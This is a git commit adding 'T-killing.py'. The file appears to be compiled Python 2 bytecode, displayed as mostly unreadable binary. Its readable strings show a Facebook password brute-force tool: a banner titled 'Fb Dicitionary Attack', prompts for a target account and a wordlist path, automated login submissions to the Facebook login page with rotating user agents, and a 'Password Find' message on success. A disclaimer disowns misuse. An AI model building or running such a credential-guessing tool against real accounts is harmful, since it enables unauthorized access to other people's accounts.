ac377bd85fe784291fcf71107b92470eaf8cb69b
massom007 <44805842+massom007@users.noreply.github.com>
2018-11-07 02:56:12 +0500

    Add files via upload

---
+++ T-killing.py
@@ -0,0 +1,113 @@
+ó
+	bß[c@s~ddlZddlZddlZddlZdd)d„ƒYZejGHdGHdGHdGHd
+GHdGHd	GHd
+GHd
+GHejGHd
+GHd
+GHd
+GHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHdGHej
+GHdGHdGHHejGHe	e
+dƒƒZ
+ej
+GHe	e
+d ƒƒZ
+d!Z
+d*gZd$„ZejGHd%„Zd&„ZejGHd'„Zed(krzeƒndS(+iÿÿÿÿNt
+bcolorscBsbeZdZdZdZdZdZdZ
+dZd
+Z	dZ
+d	Z
+d
+Z
+d
+Z
+dZ
+d
+ZdZRS(
+s
+[0;32ms[01;31ms[0ms
+[0;36ms
+[0;34ms
+[1;37ms[4ms[95ms[94ms[92ms[93ms[91ms[1m(t__name__t
+__module__tHIJAUtMERAHtNORMALtCYANtBIRUtPUTIHt	UNDERLINEtHEADERtOKBLUEt
+OKGREENt
+WARNINGtFAILtENDCtBOLD(((s
+facebook.pyRssD         |______________-_-_-_-_-----_---___----____--------________sE         | _____                    _     _    _ _ _ _              |sF         ||_   _|_ _ _ __ __ _  ___| |_  | | _(_) | (_)_ __   __ _  | sE         |  | |/ _` | '__/ _` |/ _ \ __| | |/ / | | | | '_ \ / _` | |sE         |  | | (_| | | | (_| |  __/ |_  |   <| | | | | | | | (_| | |sE         |  |_|\__,_|_|  \__, |\___|\__| |_|\_\_|_|_|_|_| |_|\__, | |sE         |               |___/                               |___/  |sE          ------------!________________!------------_________!------|s1                /---------------------------/\-' s0               /___________________________/ !' s1              ||                         !! \!'  s0              !!  Fb Dicitionary Attack  !!  !' s0              !!                         !!  !' s0              !!  Tool-name[ T-killing ] !!  !' s0              !! coded by Shehroz Khanzz !!  !' s0              !!     enjoy and share     !!  /' s/              !!_________________________!! /' s.              !`_________________________\!/' s,                __\_________________/__|!_' s+              /_____\____________/_____!/' s)              ________________________'| s(             /oooo  oooo  oooo  oooo /!|s(            /ooooooooooooooooooooooo/ /'s'           /ooooooooooooooooooooooo/ /'s'          /C=_____________________/_/' s# I'm not responsible of any missuses$ use this tool on your Responsiblitys(Enter username or email or  Target id : sK[+]For Example <==> /sdcard/example.txt
+  
+ [?] Enter Your passlist path : s2https://www.facebook.com/login.php?login_attempt=1sDMozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0seMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1cCsŒtjƒatjƒ}tjtƒtj
+tƒtj	|ƒtj
+tƒtj
+tƒtj
+tj
+j
+ƒddƒtƒtƒdGHdS(Ntmax_timeis'Password does not exist in the wordlist(t	mechanizet
+Browsertbrt	cookielibt
+LWPCookieJartset_handle_robotstFalsetset_handle_redirecttTruet
+set_cookiejartset_handle_equivtset_handle_referertset_handle_refresht_httptHTTPRefreshProcessort
+welcometsearch(tcj((s
+facebook.pytmainGs
+
+
+
+
+
+
+
+
+cCsÖtjjdj|ƒƒtjjƒdtjt
+ƒfgt_	tj
+t
+ƒ}tj
+ddƒt
+tj
+d<|tj
+d<tjƒ}|jƒ}|t
+krÒd
+|k
+rÒdj|ƒGHtd	ƒtjd
+ƒndS(
+Ns
+[*] Trying ..... {}
+s
+User-agenttnritemailtpasst
+login_attempts
+
+[+] Password Find = {}sANY KEY to Exit....i(tsyststdouttwritetformattflushtrandomtchoicet
+useragentsRt
+addheaderstopentlogint
+select_formR&tformtsubmittgeturlt	raw_inputtexit(tpasswordtsitetsubtlog((s
+facebook.pytbruteVs
+
+
+
+
+
+
+cCs@ttdƒ}x*|D]"atjddƒattƒqWdS(Ntrs
+t(R2t
+passwordlistR:t
+replaceR>(t	passwords((s
+facebook.pyR"fs
+cCsPd}ttdƒ}|jƒ}|GHdjtƒGHdGt|ƒGdGHdGHdS(
+Ns
+ 
+   
+        R?s0 [*] Target killing start on this account>> : {}s
+ [*] Loaded :RCs% [*] Cracking start please wait ...
+
+(R2RAt	readlinesR,R&tlen(twelttotal((s
+facebook.pyR!ns
+
+
+t__main__((sDMozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0seMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(R)RRR.RRRRR
+tstrR8R&R
+RAR3R0R$RR>R"R
+R!R(((s
+facebook.pyt<module>sf
+
+
+
+		
+			
+
+
